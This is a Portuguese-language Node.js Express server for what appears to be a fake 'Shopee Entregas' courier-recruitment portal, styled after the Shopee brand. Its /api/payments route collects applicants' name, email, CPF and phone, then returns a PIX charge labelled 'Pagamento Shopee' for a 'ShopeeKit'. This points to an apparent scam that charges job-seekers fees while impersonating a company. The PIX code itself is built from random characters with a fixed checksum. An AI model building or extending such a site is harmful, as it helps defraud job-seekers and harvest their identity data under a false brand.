// @ts-nocheck
"use strict";

/**
 * Servidor Express para Heroku com recursos completos
 * 
 * Esta versão serve os arquivos estáticos do site completo,
 * enquanto mantém a simplicidade e robustez para o Heroku.
 */

const fs = require('fs');
const path = require('path');
const express = require('express');

// Tentar importar módulos adicionais (podem não estar instalados)
let cors, compression;
try {
  cors = require('cors');
  compression = require('compression');
} catch (err) {
  console.log('⚠️ Módulos opcionais não disponíveis:', err.message);
}

// Inicializar Express
const app = express();
const PORT = process.env.PORT || 5000;

// Logar variáveis de ambiente e informações do sistema
console.log('🚀 Iniciando servidor Express para Heroku...');
console.log(`📊 PORT=${process.env.PORT}`);
console.log(`📊 NODE_ENV=${process.env.NODE_ENV}`);
console.log(`📊 NODE_VERSION=${process.version}`);
console.log(`📊 DIRETÓRIO=${process.cwd()}`);

// Middleware para logs de requisições
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

// Middleware JSON
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

// Aplicar middleware de compressão e CORS, se disponíveis
if (compression) {
  console.log('✅ Compressão ativada');
  app.use(compression());
}

if (cors) {
  console.log('✅ CORS ativado');
  app.use(cors());
}

// Verificar possíveis locais para arquivos estáticos
const rootDir = process.cwd();
const possibleDirs = [
  path.join(rootDir, 'dist'),
  path.join(rootDir, 'dist', 'client'),
  path.join(rootDir, 'public'),
  path.join(rootDir),
  path.join(rootDir, 'build'),
  path.join(rootDir, 'static')
];

// Encontrar e servir arquivos estáticos
let foundStaticDir = false;
possibleDirs.forEach(dir => {
  if (fs.existsSync(dir)) {
    console.log(`Servindo arquivos estáticos de: ${dir}`);
    app.use(express.static(dir));
    foundStaticDir = true;
    
    // Verificar se existe index.html
    const indexPath = path.join(dir, 'index.html');
    if (fs.existsSync(indexPath)) {
      console.log(`Usando index.html de: ${indexPath}`);
    }
    
    // Verificar arquivos de assets
    const assetsDir = path.join(dir, 'assets');
    if (fs.existsSync(assetsDir)) {
      console.log(`Pasta de assets encontrada em: ${assetsDir}`);
      try {
        const assets = fs.readdirSync(assetsDir).slice(0, 5);
        console.log(`Primeiros assets: ${assets.join(', ')}${assets.length >= 5 ? '...' : ''}`);
      } catch (err) {
        console.log(`Erro ao listar assets: ${err.message}`);
      }
    }
  }
});

if (!foundStaticDir) {
  console.warn('⚠️ Nenhum diretório estático foi encontrado!');
}

// API de saúde
app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    env: process.env.NODE_ENV || 'development',
    node: process.version
  });
});

// API de regiões
app.get('/api/regions', (req, res) => {
  const regions = [
    { name: 'São Paulo', abbr: 'SP', vacancies: 26 },
    { name: 'Rio de Janeiro', abbr: 'RJ', vacancies: 18 },
    { name: 'Minas Gerais', abbr: 'MG', vacancies: 12 },
    { name: 'Bahia', abbr: 'BA', vacancies: 9 },
    { name: 'Paraná', abbr: 'PR', vacancies: 8 }
  ];
  
  res.json(regions);
});

// API de benefícios
app.get('/api/benefits', (req, res) => {
  const benefits = [
    { id: 1, title: 'Horário Flexível', description: 'Faça entregas no seu próprio horário' },
    { id: 2, title: 'Ganhos Semanais', description: 'Receba seus pagamentos toda semana' },
    { id: 3, title: 'Suporte 24/7', description: 'Atendimento e suporte completo' },
    { id: 4, title: 'Seguro', description: 'Proteção durante suas entregas' }
  ];
  
  res.json(benefits);
});

// API de pagamentos
app.post('/api/payments', (req, res) => {
  try {
    const { name, email, cpf, phone, amount } = req.body;
    
    if (!name || !email || !cpf || !amount) {
      return res.status(400).json({ 
        message: 'Dados incompletos. Todos os campos são obrigatórios.' 
      });
    }
    
    // Gerar um código PIX de exemplo
    const pixCode = "00020126580014BR.GOV.BCB.PIX0136" + 
                   Math.random().toString(36).substring(2, 15) + 
                   Math.random().toString(36).substring(2, 15) + 
                   "0224Pagamento Shopee5204000053039865406" + 
                   amount.toFixed(2) + "5802BR5909ShopeeKit6009SaoPaulo62100506codigo630499AB";
    
    // QR Code PIX (URL para uma imagem de QR code)
    const pixQrCode = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" + encodeURIComponent(pixCode);
    
    // Simular resposta de API
    const payment = {
      id: `pmt_${Date.now()}`,
      pixCode,
      pixQrCode,
      status: 'pending'
    };
    
    console.log(`Pagamento simulado criado para ${name}, valor: R$${amount}`);
    res.json(payment);
  } catch (error) {
    console.error('Erro ao processar pagamento:', error);
    res.status(500).json({ 
      message: 'Erro ao processar pagamento. Tente novamente mais tarde.',
      error: error.message 
    });
  }
});

// Rota SPA - Serve o index.html para todas as rotas não-API
app.get('*', (req, res) => {
  if (req.path.startsWith('/api/')) {
    return res.status(404).json({ error: 'API endpoint não encontrado' });
  }
  
  // Tentar encontrar e servir o index.html
  for (const dir of possibleDirs) {
    const indexPath = path.join(dir, 'index.html');
    if (fs.existsSync(indexPath)) {
      return res.sendFile(indexPath);
    }
  }
  
  // Se não encontrou o index.html, mostrar uma página de contingência
  res.status(200).send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Shopee Entregas</title>
      <style>
        body {
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
          line-height: 1.6;
          color: #333;
          max-width: 1200px;
          margin: 0 auto;
          padding: 0 1rem;
        }
        header {
          background-color: #ee4d2d;
          color: white;
          padding: 2rem 1rem;
          text-align: center;
          margin-bottom: 2rem;
          border-radius: 0 0 8px 8px;
        }
        .container {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
          gap: 2rem;
          margin-bottom: 3rem;
        }
        .card {
          background-color: white;
          border-radius: 8px;
          padding: 1.5rem;
          box-shadow: 0 4px 6px rgba(0,0,0,0.1);
          transition: transform 0.2s;
        }
        .card:hover {
          transform: translateY(-5px);
        }
        .card h3 {
          color: #ee4d2d;
          margin-top: 0;
        }
        .alert {
          background-color: #f8d7da;
          color: #842029;
          padding: 1rem;
          border-radius: 8px;
          margin-bottom: 2rem;
          border-left: 4px solid #f5c2c7;
        }
        .alert h3 {
          margin-top: 0;
        }
        .cta {
          display: inline-block;
          background-color: #ee4d2d;
          color: white;
          padding: 0.8rem 1.5rem;
          text-decoration: none;
          border-radius: 4px;
          font-weight: bold;
          margin-top: 1rem;
          transition: background-color 0.2s;
        }
        .cta:hover {
          background-color: #d03a1b;
        }
        .footer {
          text-align: center;
          margin-top: 3rem;
          padding-top: 1rem;
          border-top: 1px solid #ddd;
          color: #666;
        }
      </style>
    </head>
    <body>
      <header>
        <h1>Shopee Entregas</h1>
        <p>Portal do Entregador Parceiro</p>
      </header>
      
      <div class="alert">
        <h3>🔧 Site em Manutenção</h3>
        <p>Estamos realizando uma atualização em nossos servidores para melhorar sua experiência. O site completo estará disponível em breve.</p>
      </div>
      
      <h2>Seja um Entregador Parceiro</h2>
      <div class="container">
        <div class="card">
          <h3>Horários Flexíveis</h3>
          <p>Você decide quando quer trabalhar! Faça entregas nos horários que melhor se adaptam à sua rotina.</p>
        </div>
        <div class="card">
          <h3>Ganhos Semanais</h3>
          <p>Receba seus pagamentos toda semana, sem atrasos. Quanto mais entregas, maiores seus ganhos.</p>
        </div>
        <div class="card">
          <h3>Suporte Dedicado</h3>
          <p>Conte com nossa equipe de suporte para ajudar em qualquer situação, 24 horas por dia, 7 dias por semana.</p>
        </div>
        <div class="card">
          <h3>Trabalhe em Sua Região</h3>
          <p>Realize entregas próximas à sua casa. Temos vagas em diversas regiões do Brasil.</p>
        </div>
      </div>
      
      <div style="text-align: center;">
        <a href="/cadastro" class="cta">Quero Me Cadastrar</a>
      </div>
      
      <div class="footer">
        <p>&copy; ${new Date().getFullYear()} Shopee Entregas | Todos os direitos reservados.</p>
        <small>Servidor: ${process.env.NODE_ENV || 'development'} | ${process.version}</small>
      </div>
    </body>
    </html>
  `);
});

// Iniciar o servidor
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Servidor Express rodando em http://0.0.0.0:${PORT}`);
});

// Tratamento de erro na inicialização do servidor
server.on('error', (error) => {
  console.error(`❌ ERRO AO INICIAR SERVIDOR: ${error.message}`);
  
  if (error.code === 'EADDRINUSE') {
    console.error(`❌ Porta ${PORT} já está em uso`);
  }
});

// Tratamento de sinais para encerramento limpo
process.on('SIGTERM', () => {
  console.log('🛑 Recebido sinal SIGTERM');
  server.close(() => {
    console.log('✅ Servidor encerrado com sucesso');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('🛑 Recebido sinal SIGINT');
  server.close(() => {
    console.log('✅ Servidor encerrado com sucesso');
    process.exit(0);
  });
});